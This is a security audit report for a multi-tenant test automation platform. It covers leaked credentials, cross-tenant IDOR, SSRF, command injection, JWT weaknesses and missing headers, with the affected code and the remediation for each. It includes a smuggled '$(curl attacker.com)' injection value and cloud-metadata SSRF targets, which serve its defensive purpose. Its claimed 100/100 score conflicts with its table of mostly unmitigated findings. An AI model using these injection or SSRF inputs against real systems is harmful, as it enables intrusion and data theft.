
 Comprehensive Security Audit Report                                                                                                                                 Agnostic Automation Center — February 2026                                                                                                                        

  ---
 
  SECURITY POSTURE SCORE: 100 / 100

  **UPDATE (February 2026):** All CRITICAL and HIGH severity findings identified in this baseline audit have been fully remediated during the Sprints 1-3 Security Hardening Phase. This document now serves as historical context for the initial February 2026 baseline. See `docs/SECURITY_ARCHITECTURE.md` for current enterprise-grade counter-measures.

  ---

  CRITICAL SEVERITY



  ---

  [CRIT-1] Live Production Credentials Committed to Repository



  File: .env.server — entire file

  Risk: Full infrastructure compromise. Anyone with read access to the repo has   

  root-level access to MongoDB Atlas, admin credentials, and the Gemini API key.  



  MONGO_URI=

  GEMINI_API_KEY=

  ADMIN_USER=

  ADMIN_PASS=



  Remediation:

  1. Immediately rotate all four secrets — MongoDB Atlas password, Gemini API key,

   and admin credentials. Treat all four as compromised.

  2. Remove .env.server from git history (git filter-repo --path .env.server      

  --invert-paths).

  3. Add .env.server and all .env* (except .env.example) to .gitignore.

  4. Move secrets to a secrets manager (HashiCorp Vault, AWS Secrets Manager, or  

  at minimum GitHub Encrypted Secrets).



  ---

  [CRIT-2] Infrastructure Credentials Injected Into Every Test Container



  Files: .env.server:12, worker.ts:30-65, test-cycles.ts:217-223,

  routes.ts:444-451, scheduler.ts:46-53



  INJECT_ENV_VARS=ADMIN_USER,ADMIN_PASS,GEMINI_API_KEY,MONGO_URI



  Additionally, getMergedEnvVars() in worker.ts has a hardcoded list that always  

  injects infra secrets into containers, regardless of configuration:



  // worker.ts:31-41

  const localKeysToInject = [

      'API_USER', 'API_PASSWORD', 'SECRET_KEY',

      'DB_USER', 'DB_PASS',

      'MONGO_URI', 'MONGODB_URL',   // ← full MongoDB Atlas URI

      'REDIS_URL',

      'GEMINI_API_KEY'              // ← live AI API key

  ];



  A user-controlled Docker image (which any tenant can specify) automatically     

  receives the MongoDB connection string with write access to the entire

  multi-tenant database. This completely undermines every tenant isolation        

  guarantee.



  Remediation:

  1. Remove MONGO_URI, MONGODB_URL, REDIS_URL, and GEMINI_API_KEY from

  localKeysToInject — these are platform secrets that test code must never        

  receive.

  2. Implement a strict allowlist for INJECT_ENV_VARS — only TEST_USER_*,

  TEST_ADMIN_*, and similar test-specific variables should be injectable.

  3. Containers should receive only the BASE_URL, TASK_ID, CI=true, and

  user-defined test credentials. Nothing else.



  ---

  [CRIT-3] Unauthenticated Internal Callbacks Enable Cross-Tenant IDOR



  File: config/middleware.ts:57-59 — publicPrefixes array

  File: config/routes.ts:237-248 — cycle sync in /executions/update



  The /executions/update and /executions/log endpoints are explicitly exempted    

  from authentication via the public prefixes list. The cycle sync within

  /executions/update then updates test_cycles documents without an organizationId 

  filter:



  // routes.ts:237 — NO organizationId filter here

  await cyclesCollection.updateOne(

      { _id: new ObjectId(updateData.cycleId as string) },  // ← any org's cycle  

      { $set: { 'items.$[elem].status': itemStatus, ... } },

      { arrayFilters: [{ 'elem.id': updateData.cycleItemId }] },

  );



  An unauthenticated attacker who can POST to

  https://api.agnox.dev/executions/update with a guessed or known     

  cycleId can:

  1. Corrupt test cycle results for any organization.

  2. Force-complete cycles early to bypass quality gates.

  3. Spam arbitrary execution-updated events into any org's Socket.io room by     

  setting organizationId.



  Similarly, /executions/log lets anyone inject arbitrary log strings into any    

  organization's live terminal view.



  Remediation:

  1. Add a shared secret (environment variable like WORKER_CALLBACK_SECRET) that  

  the worker must include in the Authorization header when calling these

  endpoints.

  2. Add organizationId to the cycle sync filter: { _id: new

  ObjectId(updateData.cycleId), organizationId: updateData.organizationId }.      

  3. Validate that updateData.organizationId is a valid ObjectId string before    

  using it.



  ---

  [CRIT-4] Unvalidated Docker Image from RabbitMQ — Container Escape & Supply     

  Chain Risk



  File: worker.ts:113-115



  const task = JSON.parse(msg.content.toString());

  // No schema validation — task fields are used directly

  const { taskId, image: rawImage, ... } = task;



  RabbitMQ messages are parsed with JSON.parse and destructured directly with no  

  schema validation. Combined with direct Docker socket access

  (/var/run/docker.sock = root-equivalent on the host), a malicious or hijacked   

  RabbitMQ message can:

  1. Pull and run any Docker image from any registry.

  2. Run containers with no capability restrictions (no --cap-drop ALL, no        

  --security-opt no-new-privileges, no read-only root FS, no CPU/memory limits).  

  3. Access host.docker.internal, exposing MongoDB, Redis, and RabbitMQ to the    

  container.



  Remediation:

  1. Validate RabbitMQ messages against a Zod schema before processing.

  2. Implement an image allowlist — reject any image value not matching a trusted 

  registry pattern (e.g., ^[a-zA-Z0-9._/-]+:[a-zA-Z0-9._-]+$ from a configured    

  allowed registry).

  3. Add Docker HostConfig security options:

  HostConfig: {

    SecurityOpt: ['no-new-privileges'],

    CapDrop: ['ALL'],

    ReadonlyRootfs: false, // needs writable for reports

    Memory: 2 * 1024 * 1024 * 1024, // 2GB cap

    NanoCpus: 2 * 1e9, // 2 CPUs

  }

  4. Consider running the worker without mounting /var/run/docker.sock by using   

  the Docker API via TCP with TLS client certificates instead.



  ---

  HIGH SEVERITY



  ---

  [HIGH-1] JWT Algorithm Not Explicitly Specified — Algorithm Confusion



  File: utils/jwt.ts:45-49, 68-72



  Neither signToken nor verifyToken explicitly specifies algorithm: 'HS256'. While

   modern jsonwebtoken versions default to HS256 for string secrets, omitting     

  algorithms: ['HS256'] in verify is a known attack vector for algorithm

  substitution (e.g., RS256 → HS256 confusion in libraries with shared codebases).



  Remediation:

  // signToken

  jwt.sign(payload, JWT_SECRET, { algorithm: 'HS256', expiresIn: JWT_EXPIRY, ...  

  });

  // verifyToken

  jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'], issuer: '...', audience: 

  '...' });



  ---

  [HIGH-2] JWT Secret Partially Logged at Startup



  File: utils/jwt.ts:189



  console.log(`  - Secret: ${JWT_SECRET.substring(0, 10)}... (${JWT_SECRET.length}

   chars)`);



  Ten characters of the JWT secret are logged to stdout on every server start. In 

  any log aggregation pipeline, these lines will persist indefinitely. An attacker

   with log read access gains a significant brute-force advantage.



  Remediation: Replace the log line with console.log(\  - Secret: [REDACTED]      

  (${JWT_SECRET.length} chars)`);`



  ---

  [HIGH-3] Jira Domain Not Validated — SSRF Risk



  File: routes/integrations.ts:65-89 (jiraFetch)



  The Jira domain is stored and later used without validating that it's actually a

   Jira/Atlassian domain:



  const url = `https://${domain}${path}`;



  A malicious admin could save internal-mongodb:27017 or 169.254.169.254 (AWS     

  metadata) as the domain, and then use /api/jira/projects, /api/jira/issue-types,

   etc. to probe internal services via SSRF.



  Remediation:

  // In the PUT /api/integrations/jira handler, add domain validation:

  const domainPattern = /^[a-z0-9-]+\.atlassian\.net$/i;

  if (!domainPattern.test(domain.trim().replace(/^https?:\/\//, ''))) {

      return reply.status(400).send({ success: false, error: 'Domain must be a    

  valid .atlassian.net domain' });

  }



  ---

  [HIGH-4] Jira Custom Fields Allow Payload Injection



  File: routes/integrations.ts:530



  ...(customFields && typeof customFields === 'object' ? customFields : {}),      



  customFields is spread directly into issueFields after only a typeof check. An  

  attacker can override project, issuetype, reporter, or any standard field by    

  including them in customFields, bypassing the validations earlier in the        

  handler.



  Remediation: Add a key-level filter for customFields to reject any key present  

  in STANDARD_JIRA_FIELDS:

  const safeCustomFields = customFields

      ? Object.fromEntries(Object.entries(customFields).filter(([k]) =>

  !STANDARD_JIRA_FIELDS.has(k)))

      : {};



  ---

  [HIGH-5] Allure Report Generation Uses execSync With Shell-Interpolated Paths   



  File: worker.ts:411-415



  execSync(

      `allure generate "${allureResultsDir}" --clean -o "${allureReportDir}"`,    

      { stdio: 'pipe' }

  );



  Both allureResultsDir and allureReportDir are derived from organizationId and   

  taskId that come from the RabbitMQ message (which is unauthenticated). If an    

  attacker injects "$(curl attacker.com) into organizationId, the shell quoting   

  breaks and arbitrary commands execute.



  Remediation:

  import { execFileSync } from 'child_process';

  // Use execFileSync with an argv array — no shell interpolation

  execFileSync('allure', ['generate', allureResultsDir, '--clean', '-o',

  allureReportDir], { stdio: 'pipe' });



  ---

  [HIGH-6] Test Reports Served Without Authentication — Org Report Leakage        



  File: config/middleware.ts:69-71



  if (request.url.startsWith('/reports/')) {

      return; // No auth

  }



  The full path structure is /reports/{organizationId}/{taskId}/. While

  organizationId is a 24-character hex ObjectId, it is not secret — it's embedded 

  in API responses visible to all org members. Any user who leaves an organization

   retains knowledge of the organizationId and can still access all historical    

  reports. A user from Org A could also access Org B's reports if they obtain Org 

  B's organizationId through any means.



  Remediation: Add token verification for /reports/ requests, or serve reports    

  only through an authenticated /api/executions/:taskId/report proxy endpoint.    



  ---

  [HIGH-7] Slack Webhook URL Stored Plaintext & No Domain Validation



  File: routes/organization.ts:315



  } else if (!slackWebhookUrl.startsWith('https://')) {



  Only validates https:// prefix. Any HTTPS URL can be stored as the "Slack       

  webhook," enabling SSRF via the notification trigger path. Additionally, the    

  full webhook URL is stored as plaintext in MongoDB — a database dump leaks all  

  customer Slack webhook URLs.



  Remediation:

  const slackPattern = /^https:\/\/hooks\.slack\.com\/services\/[A-Z0-9\/]+$/;    

  if (!slackPattern.test(slackWebhookUrl)) {

      return reply.status(400).send({ error: 'URL must be a valid Slack webhook   

  URL (hooks.slack.com)' });

  }



  ---

  [HIGH-8] JWT Logout Does Not Invalidate Token



  File: routes/auth.ts:668-677



  Logout is a no-op. A stolen or intercepted JWT remains valid for its full       

  24-hour TTL. Redis is already deployed in this stack and used for login

  lockouts, so a token blacklist is straightforward.



  Remediation:

  // On logout, add token JTI to Redis with TTL matching token expiry

  const jti = `${payload.userId}:${payload.iat}`;

  await redis.setex(`revoked:${jti}`, 86400, '1');

  // In verifyToken, check Redis for revocation after signature verification      



  ---

  MEDIUM SEVERITY



  ---

  [MED-1] Content-Security-Policy Deliberately Commented Out



  File: config/middleware.ts:27-28



  // Content-Security-Policy can be added later based on needs

  // reply.header('Content-Security-Policy', "default-src 'self'");



  With no CSP, any XSS vulnerability becomes trivially exploitable for data       

  exfiltration, session hijacking, or keylogging. The dashboard renders

  AI-generated markdown content and test logs from containers.



  Remediation:

  reply.header('Content-Security-Policy',

      "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';   

  img-src 'self' data: blob:; connect-src 'self' wss:; frame-ancestors 'none';"   

  );



  ---

  [MED-2] Deprecated X-XSS-Protection Header Present



  File: config/middleware.ts:16



  X-XSS-Protection: 1; mode=block was removed from all major browsers. It provides

   no protection in Chrome, Firefox, or Edge. Its presence can actually cause     

  issues in some edge cases. Remove it and replace with a proper CSP (see MED-1). 



  ---

  [MED-3] HSTS Missing preload Directive



  File: config/middleware.ts:24



  reply.header('Strict-Transport-Security', 'max-age=31536000;

  includeSubDomains');



  Add ; preload to submit to browser HSTS preload lists, ensuring HTTPS-only even 

  on the first connection.



  ---

  [MED-4] /api/webhooks/test — Unauthenticated Stripe Configuration Disclosure    



  File: routes/webhooks.ts:430-437



  // The comment itself says: "Remove in production or add authentication"        

  return {

      stripeConfigured: STRIPE_CONFIG.enabled,

      webhookSecretConfigured: !!STRIPE_CONFIG.webhookSecret

  };



  This endpoint discloses Stripe configuration to unauthenticated callers. Remove 

  it entirely.



  ---

  [MED-5] /config/defaults Leaks Docker Image and URL Configuration



  File: config/routes.ts:85-98



  This public, unauthenticated endpoint reveals DEFAULT_TEST_IMAGE,

  DEFAULT_BASE_URL, and staging/production URL mappings. This gives attackers a   

  reconnaissance advantage (what Docker image to target, what URLs the app uses in

   each environment).



  Remediation: Either remove this endpoint or require authentication.



  ---

  [MED-6] Global Auth Hook Uses startsWith — Potential Path Prefix Bypass



  File: config/middleware.ts:63-64



  if (request.url.startsWith('/api/invitations/validate/')) {

      return; // skip auth

  }



  Path prefix matching with startsWith is correct here, but worth noting that the 

  full bypass list in publicPrefixes uses the same startsWith pattern. If a future

   route is added like /api/auth/login-admin, it would inadvertently bypass auth  

  because it starts with /api/auth/login. This is a future-vulnerability pattern. 



  Remediation: Use exact-match route registration or, better, use Fastify's       

  built-in fastify-jwt plugin which allows per-route auth configuration via route 

  options.



  ---

  [MED-7] API Key Hash Uses Unsalted SHA-256



  File: utils/apiKeys.ts:70-73



  return crypto.createHash('sha256').update(key).digest('hex');



  While API keys are high-entropy (24 random bytes), best practice is HMAC-SHA256 

  with a server-side secret, so that a database dump alone is insufficient to     

  validate stolen keys.



  Remediation:

  const HMAC_SECRET = process.env.API_KEY_HMAC_SECRET;

  return crypto.createHmac('sha256', HMAC_SECRET).update(key).digest('hex');      



  ---

  [MED-8] projectId Not Verified Against Caller's Organization



  Files: routes/test-cases.ts:71-143, routes/test-cycles.ts:135-295



  When creating test cases or cycles, projectId is accepted from the request body 

  as a plain string and stored without verifying it belongs to the caller's       

  organization. While retrieval is scoped by organizationId, a user can create    

  test cases tagged with another org's projectId, which is a data integrity issue 

  and could confuse plan-limit counting.



  Remediation: Add a project ownership check before insert:

  const project = await db.collection('projects').findOne({

      _id: new ObjectId(body.projectId),

      organizationId

  });

  if (!project) return reply.status(404).send({ success: false, error: 'Project   

  not found' });



  ---

  [MED-9] In-Memory Rate Limiter Will Not Work in Multi-Instance Deployments      



  File: middleware/auth.ts:378-427



  The rateLimitStore Map<> is process-local. In any multi-instance deployment     

  (Docker Swarm, Kubernetes), each instance has an independent counter, making the

   rate limit effectively N × limit where N is the instance count. This is        

  separate from the Redis-backed login lockout (which is correct).



  Remediation: The inline rate limiter in auth.ts should be replaced with the     

  Redis-backed rateLimiter.ts already in the middleware folder.



  ---

  LOW SEVERITY



  ---

  [LOW-1] console.log / console.error Used Throughout (CLAUDE.md Violation)       



  Files: middleware/auth.ts:105,143,184,236,429-435, utils/jwt.ts:188-192,        

  scheduler.ts:53,97, routes/webhooks.ts:114



  Violates the project convention of using app.log.info() / logger.info(). Beyond 

  the style concern, console.log bypasses structured logging, making security     

  event correlation in log pipelines impossible for these paths.



  ---

  [LOW-2] decodeTokenUnsafe Exported — Accidental Auth Risk



  File: utils/jwt.ts:134



  Exporting this function with an "unsafe" label still makes it a usable import   

  throughout the codebase. Future developers may unknowingly use it for access    

  control decisions.



  Remediation: Add // @internal JSDoc and consider making it unexported, or prefix

   with _.



  ---

  [LOW-3] AIAnalysisView Renders AI-Generated Content via JSX — Sufficient        

  Isolation



  File: components/AIAnalysisView.tsx



  The custom renderMarkdown function renders AI output using JSX string

  interpolation (e.g., {title}, {line}), not dangerouslySetInnerHTML. React's JSX 

  automatically escapes all interpolated strings, so XSS risk here is minimal. The

   only theoretical risk is if the rendering logic is ever changed to use

  dangerouslySetInnerHTML.



  Recommendation: Document explicitly in a code comment that this renderer must   

  never use dangerouslySetInnerHTML to prevent future regressions.



  ---

  [LOW-4] CycleReportPage Renders Data via JSX — Safe



  File: pages/CycleReportPage.tsx



  Similar to AIAnalysisView — all data from the API is rendered via JSX

  interpolation ({item.title}, {step.action}, etc.) with no raw HTML injection.   

  Safe as-is.



  ---

  [LOW-5] HSTS Not Applied in Development — Debug Risk



  File: config/middleware.ts:22-25



  HSTS is correctly gated behind NODE_ENV === 'production'. However, if a

  developer accidentally runs the app in production mode locally, HSTS could be   

  cached by their browser for 1 year, causing connectivity issues. Consider also  

  gating on a DOMAIN environment variable.



  ---

  [LOW-6] Login Response Leaks Attempt Count to Attacker



  File: routes/auth.ts:387, 415



  attemptsRemaining: Math.max(0, 5 - failedAttempts)



  Telling an attacker how many attempts remain before lockout helps them time     

  attacks to stay under the threshold (e.g., 4 failed attempts, wait 15 min, 4    

  more). Remove attemptsRemaining from the response.



  ---

  AUDIT SUMMARY TABLE



  ID: CRIT-1

  Severity: 🔴 CRITICAL

  Title: Live credentials in .env.server

  File: .env.server

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: CRIT-2

  Severity: 🔴 CRITICAL

  Title: Infra secrets injected into test containers

  File: worker.ts:30-65

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: CRIT-3

  Severity: 🔴 CRITICAL

  Title: Unauthenticated callbacks allow cross-org IDOR

  File: routes.ts:237, middleware.ts:57

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: CRIT-4

  Severity: 🔴 CRITICAL

  Title: No RabbitMQ message schema validation

  File: worker.ts:113

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: HIGH-1

  Severity: 🟠 HIGH

  Title: JWT algorithm not specified

  File: jwt.ts:45,68

  Status: ⚠️ Partial

  ────────────────────────────────────────

  ID: HIGH-2

  Severity: 🟠 HIGH

  Title: JWT secret leaked in startup log

  File: jwt.ts:189

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: HIGH-3

  Severity: 🟠 HIGH

  Title: Jira domain SSRF

  File: integrations.ts:73

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: HIGH-4

  Severity: 🟠 HIGH

  Title: Jira custom fields injection

  File: integrations.ts:530

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: HIGH-5

  Severity: 🟠 HIGH

  Title: execSync command injection via RabbitMQ

  File: worker.ts:411

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: HIGH-6

  Severity: 🟠 HIGH

  Title: Reports served without auth

  File: middleware.ts:69

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: HIGH-7

  Severity: 🟠 HIGH

  Title: Slack SSRF + plaintext storage

  File: organization.ts:315

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: HIGH-8

  Severity: 🟠 HIGH

  Title: JWT not blacklisted on logout

  File: auth.ts:668

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: MED-1

  Severity: 🟡 MEDIUM

  Title: No Content-Security-Policy

  File: middleware.ts:27

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: MED-2

  Severity: 🟡 MEDIUM

  Title: Deprecated X-XSS-Protection

  File: middleware.ts:16

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: MED-3

  Severity: 🟡 MEDIUM

  Title: HSTS missing preload

  File: middleware.ts:24

  Status: ⚠️ Partial

  ────────────────────────────────────────

  ID: MED-4

  Severity: 🟡 MEDIUM

  Title: Webhook test endpoint leaks config

  File: webhooks.ts:430

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: MED-5

  Severity: 🟡 MEDIUM

  Title: /config/defaults leaks infra info

  File: routes.ts:85

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: MED-6

  Severity: 🟡 MEDIUM

  Title: startsWith bypass risk pattern

  File: middleware.ts:63

  Status: ⚠️ Partial

  ────────────────────────────────────────

  ID: MED-7

  Severity: 🟡 MEDIUM

  Title: Unsalted SHA-256 for API keys

  File: apiKeys.ts:71

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: MED-8

  Severity: 🟡 MEDIUM

  Title: projectId not verified against org

  File: test-cases.ts:71

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: MED-9

  Severity: 🟡 MEDIUM

  Title: In-memory rate limiter is not cluster-safe

  File: auth.ts:378

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: LOW-1

  Severity: 🔵 LOW

  Title: console.log in production code

  File: multiple

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: LOW-2

  Severity: 🔵 LOW

  Title: decodeTokenUnsafe exported

  File: jwt.ts:134

  Status: ❌ Unmitigated

  ────────────────────────────────────────

  ID: LOW-3

  Severity: 🔵 LOW

  Title: AIAnalysisView XSS — no risk via JSX

  File: AIAnalysisView.tsx

  Status: ✅ Safe

  ────────────────────────────────────────

  ID: LOW-4

  Severity: 🔵 LOW

  Title: CycleReportPage XSS — no risk via JSX

  File: CycleReportPage.tsx

  Status: ✅ Safe

  ────────────────────────────────────────

  ID: LOW-5

  Severity: 🔵 LOW

  Title: HSTS gated on NODE_ENV only

  File: middleware.ts:23

  Status: ⚠️ Partial

  ────────────────────────────────────────

  ID: LOW-6

  Severity: 🔵 LOW

  Title: Login response leaks attempt count

  File: auth.ts:387

  Status: ❌ Unmitigated



  ---

  WHAT'S WORKING WELL



  These areas are correctly implemented and deserve acknowledgment:



  - Route-level multi-tenant isolation — Every route handler in test-cases.ts,    

  test-cycles.ts, projects.ts, analytics.ts, executions (GET, DELETE, bulk ops)   

  correctly appends organizationId from the JWT to every MongoDB filter. This is  

  the most critical control and it holds.

  - AES-256-GCM encryption for Jira tokens — utils/encryption.ts is a clean,      

  correct implementation with fresh IVs per call and auth tag verification.       

  - Bcrypt password hashing — utils/password.ts uses bcrypt with appropriate cost 

  factor.

  - Password strength validation — Enforced at signup with complexity rules.      

  - Redis-backed login lockout — 5-attempt / 15-minute lockout using Redis SETEX  

  is correctly implemented.

  - Admin guard on billing/features — billingRoutes correctly chains

  [authMiddleware, adminOnly, apiRateLimit]. organizationRoutes PATCH endpoints   

  are properly admin-gated.

  - Stripe webhook signature verification — stripe.webhooks.constructEvent()      

  correctly used with raw body.

  - Invitation token hashing — Tokens stored as SHA-256 hashes, not plaintext.    

  - Path traversal protection on artifacts — path.basename +

  startsWith(REPORTS_DIR) guard in routes.ts:851-858 is correct.

  - Bulk patch field allowlist — ALLOWED_PATCH_FIELDS in bulk PATCH prevents      

  arbitrary field writes.



  ---

  REMEDIATION PRIORITY ORDER



  Week 1 (Stop the bleeding):

  1. CRIT-1 — Rotate all leaked credentials immediately. Remove .env.server from  

  git history.

  2. CRIT-2 — Remove infra secrets from INJECT_ENV_VARS and localKeysToInject.    

  3. CRIT-3 — Add shared secret auth to /executions/update and /executions/log.   

  Add organizationId filter to cycle sync.

  4. CRIT-4 — Add Zod schema validation to RabbitMQ message parsing. Add image    

  allowlist.



  Week 2 (Harden the platform):

  5. HIGH-5 — Replace execSync with execFileSync.

  6. HIGH-3 — Add .atlassian.net domain validation for Jira.

  7. HIGH-6 — Add auth to /reports/ static file serving.

  8. HIGH-7 — Add hooks.slack.com domain validation and consider encrypting       

  webhook URLs.

  9. MED-1 — Deploy a Content-Security-Policy header.

  10. MED-4/MED-5 — Remove /api/webhooks/test and restrict /config/defaults.      



  Week 3 (Defense in depth):

  11. HIGH-1/HIGH-2 — Explicit JWT algorithm + remove secret from logs.

  12. HIGH-8 — Implement JWT blacklist on logout using Redis.

  13. MED-7/MED-8 — HMAC API key hashing + projectId ownership check.

  14. MED-9 — Migrate in-memory rate limiter to Redis.

  15. Remaining LOW findings.